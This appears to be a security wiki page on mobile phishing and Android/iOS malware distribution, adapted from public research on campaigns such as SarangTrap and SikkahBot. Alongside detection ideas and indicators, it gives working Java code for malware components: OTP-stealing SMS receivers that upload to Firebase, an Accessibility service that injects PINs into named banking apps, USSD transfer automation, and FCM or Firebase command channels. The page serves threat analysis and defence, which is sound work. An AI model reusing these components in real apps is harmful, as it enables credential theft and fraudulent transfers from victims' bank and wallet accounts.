# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> This page covers techniques used by threat actors to distribute **malicious Android APKs** and **iOS mobile-configuration profiles** through phishing (SEO, social engineering, fake stores, dating apps, etc.).
> The material is adapted from the SarangTrap campaign exposed by Zimperium zLabs (2025) and other public research.

## Attack Flow

1. **SEO/Phishing Infrastructure**
   * Register dozens of look-alike domains (dating, cloud share, car service…).  
     – Use local language keywords and emojis in the `<title>` element to rank in Google.  
     – Host *both* Android (`.apk`) and iOS install instructions on the same landing page.
2. **First Stage Download**
   * Android: direct link to an *unsigned* or “third-party store” APK.  
   * iOS: `itms-services://` or plain HTTPS link to a malicious **mobileconfig** profile (see below).
3. **Post-install Social Engineering**
   * On first run the app asks for an **invitation / verification code** (exclusive access illusion).  
   * The code is **POSTed over HTTP** to the Command-and-Control (C2).  
   * C2 replies `{"success":true}` ➜ malware continues.  
   * Sandbox / AV dynamic analysis that never submits a valid code sees **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
   * Dangerous permissions are only requested **after positive C2 response**:
     ```xml
     <uses-permission android:name="android.permission.READ_CONTACTS"/>
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <!-- Older builds also asked for SMS permissions -->
     ```
   * Recent variants **remove `<uses-permission>` for SMS from `AndroidManifest.xml`** but leave the Java/Kotlin code path that reads SMS through reflection ⇒ lowers static score while still functional on devices that grant the permission via `AppOps` abuse or old targets.
5. **Facade UI & Background Collection**
   * App shows harmless views (SMS viewer, gallery picker) implemented locally.  
   * Meanwhile it exfiltrates:
     - IMEI / IMSI, phone number
     - Full `ContactsContract` dump (JSON array)
     - JPEG/PNG from `/sdcard/DCIM` compressed with [Luban](https://github.com/Curzibn/Luban) to reduce size
     - Optional SMS content (`content://sms`)
     Payloads are **batch-zipped** and sent via `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
   * A single **mobile-configuration profile** can request `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. to enroll the device in “MDM”-like supervision.  
   * Social-engineering instructions:
     1. Open Settings ➜ *Profile downloaded*.
     2. Tap *Install* three times (screenshots on the phishing page).  
     3. Trust the unsigned profile ➜ attacker gains *Contacts* & *Photo* entitlement without App Store review.
7. **Network Layer**
   * Plain HTTP, often on port 80 with HOST header like `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (no TLS → easy to spot).

## Defensive Testing / Red-Team Tips

* **Dynamic Analysis Bypass** – During malware assessment, automate the invitation code phase with Frida/Objection to reach the malicious branch.
* **Manifest vs. Runtime Diff** – Compare `aapt dump permissions` with runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms is a red flag.
* **Network Canary** – Configure `iptables -p tcp --dport 80 -j NFQUEUE` to detect unsolid POST bursts after code entry.
* **mobileconfig Inspection** – Use `security cms -D -i profile.mobileconfig` on macOS to list `PayloadContent` and spot excessive entitlements.

## Blue-Team Detection Ideas

* **Certificate Transparency / DNS Analytics** to catch sudden bursts of keyword-rich domains.
* **User-Agent & Path Regex**: `(?i)POST\s+/(check|upload)\.php` from Dalvik clients outside Google Play.
* **Invite-code Telemetry** – POST of 6–8 digit numeric codes shortly after APK install may indicate staging.
* **MobileConfig Signing** – Block unsigned configuration profiles via MDM policy.

## Useful Frida Snippet: Auto-Bypass Invitation Code

```python
# frida -U -f com.badapp.android -l bypass.js --no-pause
# Hook HttpURLConnection write to always return success
Java.perform(function() {
  var URL = Java.use('java.net.URL');
  URL.openConnection.implementation = function() {
    var conn = this.openConnection();
    var HttpURLConnection = Java.use('java.net.HttpURLConnection');
    if (Java.cast(conn, HttpURLConnection)) {
        conn.getResponseCode.implementation = function(){ return 200; };
        conn.getInputStream.implementation = function(){
            return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
        };
    }
    return conn;
  };
});
```

## Indicators (Generic)

```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```

---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.

### Delivery chain across trusted platforms
- YouTube video lure → description contains a short link
- Shortlink → GitHub Pages phishing site imitating the legit portal
- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
- Dynamic phishing pages live on Replit; remote command channel uses Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.

Static triage tip (grep for embedded payloads):

```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```

### Dynamic endpoint discovery via shortlink
- Malware fetches a plain-text, comma-separated list of live endpoints from a shortlink; simple string transforms produce the final phishing page path.

Example (sanitised):

```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```

Pseudo-code:

```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```

### WebView-based UPI credential harvesting
- The “Make payment of ₹1 / UPI‑Lite” step loads an attacker HTML form from the dynamic endpoint inside a WebView and captures sensitive fields (phone, bank, UPI PIN) which are `POST`ed to `addup.php`.

Minimal loader:

```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```

### Self-propagation and SMS/OTP interception
- Aggressive permissions are requested on first run:

```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```

- Contacts are looped to mass-send smishing SMS from the victim’s device.
- Incoming SMS are intercepted by a broadcast receiver and uploaded with metadata (sender, body, SIM slot, per-device random ID) to `/addsm.php`.

Receiver sketch:

```java
public void onReceive(Context c, Intent i){
  SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
  for (SmsMessage m: msgs){
    postForm(urlAddSms, new FormBody.Builder()
      .add("senderNum", m.getOriginatingAddress())
      .add("Message", m.getMessageBody())
      .add("Slot", String.valueOf(getSimSlot(i)))
      .add("Device rand", getOrMakeDeviceRand(c))
      .build());
  }
}
```

### Firebase Cloud Messaging (FCM) as resilient C2
- The payload registers to FCM; push messages carry a `_type` field used as a switch to trigger actions (e.g., update phishing text templates, toggle behaviours).

Example FCM payload:

```json
{
  "to": "<device_fcm_token>",
  "data": {
    "_type": "update_texts",
    "template": "New subsidy message..."
  }
}
```

Handler sketch:

```java
@Override
public void onMessageReceived(RemoteMessage msg){
  String t = msg.getData().get("_type");
  switch (t){
    case "update_texts": applyTemplate(msg.getData().get("template")); break;
    case "smish": sendSmishToContacts(); break;
    // ... more remote actions
  }
}
```

### Hunting patterns and IOCs
- APK contains secondary payload at `assets/app.apk`
- WebView loads payment from `gate.htm` and exfiltrates to `/addup.php`
- SMS exfiltration to `/addsm.php`
- Shortlink-driven config fetch (e.g., `rebrand.ly/*`) returning CSV endpoints
- Apps labelled as generic “Update/Secure Update”
- FCM `data` messages with a `_type` discriminator in untrusted apps

### Detection & defence ideas
- Flag apps that instruct users to disable network during install and then side-load a second APK from `assets/`.
- Alert on the permission tuple: `READ_CONTACTS` + `READ_SMS` + `SEND_SMS` + WebView-based payment flows.
- Egress monitoring for `POST /addup.php|/addsm.php` on non-corporate hosts; block known infrastructure.
- Mobile EDR rules: untrusted app registering for FCM and branching on a `_type` field.

---

## Accessibility-based ODF: Input Injection against Wallet/Banking Apps

Once a victim enables a rogue Accessibility Service, malware can detect targeted banking apps in the foreground and perform On-Device-Fraud (ODF) by programmatically entering PINs and navigating the UI.

Minimal pattern:

```java
public class FraudService extends AccessibilityService {
  private Set<String> targets = new HashSet<>(Arrays.asList(
      "com.bkash.customerapp", "com.konasl.nagad", "com.dutchbanglabank.mBaking"));

  @Override public void onAccessibilityEvent(AccessibilityEvent e) {
    if (e.getEventType() == TYPE_WINDOW_STATE_CHANGED || e.getEventType() == TYPE_WINDOW_CONTENT_CHANGED) {
      CharSequence pkg = e.getPackageName();
      if (pkg != null && targets.contains(pkg.toString())) {
        String pin = fetchPinFromC2(); // e.g., Firebase RTDB
        // Try direct text injection first
        fillAllEditTexts(pin);
        // Or fallback to gesture-based keypad tapping
        typeWithGestures(pin);
      }
    }
  }

  private void fillAllEditTexts(String text){
    AccessibilityNodeInfo root = getRootInActiveWindow();
    if (root == null) return;
    List<AccessibilityNodeInfo> inputs = new ArrayList<>();
    dfs(root, inputs);
    for (AccessibilityNodeInfo n : inputs){
      if (n.isEditable()){
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        n.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
      }
    }
  }

  private void dfs(AccessibilityNodeInfo n, List<AccessibilityNodeInfo> out){
    if (n == null) return;
    if ("android.widget.EditText".contentEquals(n.getClassName())) out.add(n);
    for (int i=0;i<n.getChildCount();i++) dfs(n.getChild(i), out);
  }

  private void typeWithGestures(String text){
    for (char c: text.toCharArray()){
      PointF p = keypadCoordinateFor(c); // hardcode or learn per target
      Path path = new Path(); path.moveTo(p.x, p.y);
      GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(path, 0, 40);
      dispatchGesture(new GestureDescription.Builder().addStroke(s).build(), null, null);
      SystemClock.sleep(60);
    }
  }
}
```

For an in-depth primer on abusing Accessibility for remote UI automation and overlays, see:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

---

## Targeted SMS/OTP Interception via BroadcastReceiver (Banking Filters)

Banking malware commonly registers an `SMS_RECEIVED` BroadcastReceiver, filters by sender IDs or keywords (bank names), and forwards matching OTPs/alerts to C2.

Manifest:

```xml
<uses-permission android:name="android.permission.RECEIVE_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>

<receiver android:name=".SmsRx" android:exported="true">
  <intent-filter>
    <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
    <action android:name="android.provider.Telephony.SMS_DELIVER"/>
  </intent-filter>
</receiver>
```

Receiver with filters and Firebase RTDB exfiltration:

```java
public class SmsRx extends BroadcastReceiver {
  private static final Pattern BANK = Pattern.compile("(?i)(bkash|nagad|mygp|otp|transaction)");
  private static final Set<String> SENDERS = new HashSet<>(Arrays.asList("16216","26969","009638543210"));
  private static final String RTDB = "https://<project>.firebaseio.com";

  @Override public void onReceive(Context c, Intent i){
    for (SmsMessage m: Telephony.Sms.Intents.getMessagesFromIntent(i)){
      String from = String.valueOf(m.getOriginatingAddress());
      String body = String.valueOf(m.getMessageBody());
      if (SENDERS.contains(from) || BANK.matcher(body).find()){
        JSONObject j = new JSONObject();
        try{
          j.put("from", from).put("body", body).put("ts", System.currentTimeMillis());
        } catch(Exception ignored){}
        httpPut(RTDB+"/devices/"+deviceId(c)+"/sms/"+System.currentTimeMillis()+".json", j.toString());
      }
    }
  }
}
```

Static hunting tip: look for `Telephony.Sms.Intents.getMessagesFromIntent` and hard-coded sender lists / bank-name regexes.

---

## Offline USSD Transaction Automation (No Internet Required)

When a target banking app is not in focus, malware can trigger **USSD sessions** to perform transfers via the mobile operator. This is typically coupled with Accessibility to parse/answer the modal USSD dialogs from the dialer.

Dialling a USSD code and selecting SIM slot:

```java
// CALL_PHONE permission required
void dialUssd(Context ctx, String code, int simSlot){
  Uri uri = Uri.parse("tel:" + Uri.encode(code)); // e.g., *247#
  TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
  List<PhoneAccountHandle> accs = tm.getCallCapablePhoneAccounts();
  Bundle extras = new Bundle();
  if (simSlot >= 0 && simSlot < accs.size())
    extras.putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, accs.get(simSlot));
  tm.placeCall(uri, extras);
}
```

Parsing and answering USSD dialogs via Accessibility:

```java
// In your AccessibilityService
private void answerUssd(String reply){
  AccessibilityNodeInfo root = getRootInActiveWindow();
  if (root == null) return;
  // Find input
  List<AccessibilityNodeInfo> edits = root.findAccessibilityNodeInfosByViewId("android:id/input");
  if (edits.isEmpty()) edits = findByClass(root, "android.widget.EditText");
  if (!edits.isEmpty()){
    Bundle b = new Bundle();
    b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, reply);
    edits.get(0).performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
  }
  // Click SEND / OK
  for (String label: Arrays.asList("SEND","Send","send","OK","Ok","ok")){
    List<AccessibilityNodeInfo> btns = root.findAccessibilityNodeInfosByText(label);
    for (AccessibilityNodeInfo n: btns){ n.performAction(AccessibilityNodeInfo.ACTION_CLICK); }
  }
}

private List<AccessibilityNodeInfo> findByClass(AccessibilityNodeInfo n, String cls){
  List<AccessibilityNodeInfo> out = new ArrayList<>();
  if (n == null) return out;
  if (cls.contentEquals(n.getClassName())) out.add(n);
  for (int i=0;i<n.getChildCount();i++) out.addAll(findByClass(n.getChild(i), cls));
  return out;
}
```

Hunting patterns:
- `TelecomManager.placeCall` with `Uri.encode("*"...)` and `EXTRA_PHONE_ACCOUNT_HANDLE` for SIM selection
- Accessibility searches for dialog text + button labels `SEND|OK` and `ACTION_SET_TEXT` on `EditText`

---

## Firebase Realtime Database (RTDB) as C2 and Data Store

Instead of a custom backend, many mobile crews rely on **Firebase Realtime Database** for both exfiltration and tasking. RTDB blends with legitimate Google traffic and offers simple **REST endpoints**.

Minimal REST usage with OkHttp:

```java
// write data
void rtdbPut(String base, String path, JSONObject obj){
  Request r = new Request.Builder()
      .url(base + path + ".json") // e.g., https://<proj>.firebaseio.com/devices/<id>/tasks.json
      .put(RequestBody.create(obj.toString(), MediaType.get("application/json")))
      .build();
  client.newCall(r).execute();
}

// poll for commands
JSONObject rtdbGet(String base, String path){
  Request r = new Request.Builder().url(base + path + ".json").get().build();
  Response resp = client.newCall(r).execute();
  return new JSONObject(resp.body().string());
}
```

Notes
- Public RTDBs (rules set to `true`) require no auth; otherwise add `?auth=<idToken>`.
- For near real-time tasking without FCM, use the REST streaming API (`Accept: text/event-stream`) on `<path>.json` to receive `put`/`patch` events.
- Common paths: `/devices/<android_id>/sms`, `/devices/<id>/pii`, `/tasks/<id>` with fields like `{ "ussd": "*247*1*<num>#", "sim": 0, "pin": "1234" }`.

Detection ideas
- Alert on `*.firebaseio.com` writes from unknown apps; inspect payload structure for device identifiers.
- Blocklist known project IDs seen in malware; monitor REST streaming connections.

---

## References

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [SikkahBot Malware Campaign Lures and Defrauds Students in Bangladesh (Cyble CRIL)](https://cyble.com/blog/sikkahbot-malware-defrauds-students-in-bangladesh/)
- [Firebase Realtime Database — REST API](https://firebase.google.com/docs/database/rest/start)
- [Android AccessibilityService — Guide](https://developer.android.com/guide/topics/ui/accessibility/service)
- [Android Telephony — SMS Intents](https://developer.android.com/reference/android/provider/Telephony.Sms.Intents)
- [Android TelecomManager — placeCall](https://developer.android.com/reference/android/telecom/TelecomManager#placeCall(android.net.Uri,%20android.os.Bundle))

{{#include ../../banners/hacktricks-training.md}}